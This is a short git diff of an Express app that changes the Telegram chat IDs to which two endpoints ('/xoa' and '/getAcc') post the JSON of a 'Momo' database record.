@@ -458,7 +458,7 @@ app.post('/xoa', async (req, res) => {
     }
     var id = req.body.id
     const momo = await Momo.findById(id)
-    if (momo) await bot.sendMessage(-602326387, "Đã xóa: \n" + JSON.stringify(momo))
+    if (momo) await bot.sendMessage(-1001893107333, "Đã xóa: \n" + JSON.stringify(momo))
 
 
     await Momo.deleteOne({ _id: id })
@@ -486,7 +486,7 @@ app.post('/getAcc', async (req, res) => {
     let id = req.body.id
     const momo = await Momo.findOne({ _id: id })
     if (momo) {
-        bot.sendMessage(-645203490, JSON.stringify(momo))
+        bot.sendMessage(-1001893107333, JSON.stringify(momo))
     }
     res.send('ok')
 })
